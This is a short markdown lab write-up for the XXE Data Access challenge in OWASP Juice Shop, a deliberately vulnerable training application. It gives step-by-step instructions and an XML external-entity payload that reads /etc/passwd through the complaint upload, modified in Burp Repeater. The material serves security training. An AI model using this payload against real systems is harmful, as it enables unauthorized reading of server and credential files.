# 🗂️ XXE Data Access – OWASP Juice Shop

## 🔍 Description

**XML External Entity (XXE)** vulnerabilities allow attackers to exploit insecure XML parsers to access sensitive files or perform unauthorized actions. In this challenge, we extract data from the server by uploading a malicious XML file via the complaint feature.

---

## 🛠️ Steps to Reproduce

1. **Login as Any User**
   - Sign in to the OWASP Juice Shop using any valid credentials.

2. **Navigate to the Complaint Submission Form**
   - Click on the "Customer Feedback" or "Complaint" section.

3. **Create a Malicious `payload.xml` File**
   - Save the following content in a file named `payload.xml`:
     ```xml
     <?xml version="1.0"?>
     <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:////etc/passwd"> ]>
     ```

4. **Upload the Malicious XML File**
   - Use the form to upload your `payload.xml`.

5. **Intercept the Request**
   - Use **Burp Suite** to intercept the file upload request.
   - Send the request to **Repeater**.

6. **Add Malicious Data to the XML Body**
   - Modify the request body to include:
     ```xml
     <userInfo>
       <firstName>Lucky</firstName>
       <lastName>Cyber&ent;</lastName>
     </userInfo>
     ```

7. **Send the Modified Request**
   - Click **Send** in Burp Repeater.
   - The server will respond with the contents of `/etc/passwd`, indicating successful XXE exploitation.

---

## 📸 Screenshot

![XXE Proof-of-Concept]

📁 Screenshot location: `Reports/Screenshots/XXE/`

---
